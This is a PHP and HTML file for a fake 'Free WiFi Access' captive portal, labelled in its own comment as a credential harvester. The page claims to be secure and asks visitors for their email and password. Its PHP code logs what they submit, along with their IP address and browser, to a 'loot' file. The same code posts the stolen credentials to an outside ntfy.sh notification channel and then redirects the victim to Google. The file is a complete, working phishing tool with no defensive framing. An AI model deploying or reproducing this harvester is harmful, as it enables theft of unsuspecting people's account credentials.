<?php
// GARMR Generic WiFi Portal - Credential Harvester
$loot_file = '/root/loot/garmr/creds.txt';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    $timestamp = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'];
    $ua = $_SERVER['HTTP_USER_AGENT'];

    $log = "[$timestamp] WIFI | Email: $email | Password: $password | IP: $ip | UA: $ua\n";
    file_put_contents($loot_file, $log, FILE_APPEND | LOCK_EX);

    $ntfy_msg = "📶 WIFI CREDS\nEmail: $email\nPass: $password\nIP: $ip";
    @file_get_contents("https://ntfy.sh/HALE-Pager-Alerts", false, stream_context_create([
        'http' => ['method' => 'POST', 'header' => 'Content-Type: text/plain', 'content' => $ntfy_msg]
    ]));

    header('Location: http://www.google.com');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free WiFi Access</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 16px;
            padding: 40px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }
        .logo {
            width: 100px;
            height: 100px;
            margin: 0 auto 20px;
        }
        .logo svg {
            width: 100%;
            height: 100%;
        }
        h1 {
            color: #333;
            font-size: 24px;
            margin-bottom: 8px;
            font-weight: 600;
        }
        .subtitle {
            color: #666;
            margin-bottom: 30px;
            font-size: 14px;
        }
        .form-group {
            margin-bottom: 16px;
            text-align: left;
        }
        label {
            display: block;
            color: #333;
            font-weight: 500;
            margin-bottom: 6px;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.2s;
        }
        input:focus {
            outline: none;
            border-color: #667eea;
        }
        button {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
        }
        .features {
            margin-top: 25px;
            display: flex;
            justify-content: space-around;
            padding-top: 20px;
            border-top: 1px solid #eee;
        }
        .feature {
            text-align: center;
        }
        .feature-icon {
            font-size: 24px;
            margin-bottom: 5px;
        }
        .feature-text {
            font-size: 11px;
            color: #666;
        }
        .terms {
            margin-top: 20px;
            font-size: 11px;
            color: #999;
            line-height: 1.5;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                <!-- WiFi signal icon -->
                <circle cx="50" cy="50" r="48" fill="url(#grad)"/>
                <defs>
                    <linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="100%">
                        <stop offset="0%" style="stop-color:#667eea"/>
                        <stop offset="100%" style="stop-color:#764ba2"/>
                    </linearGradient>
                </defs>
                <!-- WiFi arcs -->
                <path d="M50 75 L50 70" stroke="white" stroke-width="6" stroke-linecap="round"/>
                <path d="M30 55 Q50 35 70 55" fill="none" stroke="white" stroke-width="5" stroke-linecap="round"/>
                <path d="M20 45 Q50 20 80 45" fill="none" stroke="white" stroke-width="5" stroke-linecap="round"/>
                <path d="M10 35 Q50 5 90 35" fill="none" stroke="white" stroke-width="5" stroke-linecap="round"/>
            </svg>
        </div>

        <h1>Free WiFi Access</h1>
        <p class="subtitle">Sign in to connect to the internet</p>

        <form method="POST" action="capture.php">
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" placeholder="your@email.com" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit">Connect to WiFi</button>
        </form>

        <div class="features">
            <div class="feature">
                <div class="feature-icon">🚀</div>
                <div class="feature-text">High Speed</div>
            </div>
            <div class="feature">
                <div class="feature-icon">🔒</div>
                <div class="feature-text">Secure</div>
            </div>
            <div class="feature">
                <div class="feature-icon">♾️</div>
                <div class="feature-text">Unlimited</div>
            </div>
        </div>

        <p class="terms">
            By connecting, you agree to our Terms of Service and Privacy Policy.
            Your activity may be monitored for security purposes.
        </p>
    </div>
</body>
</html>
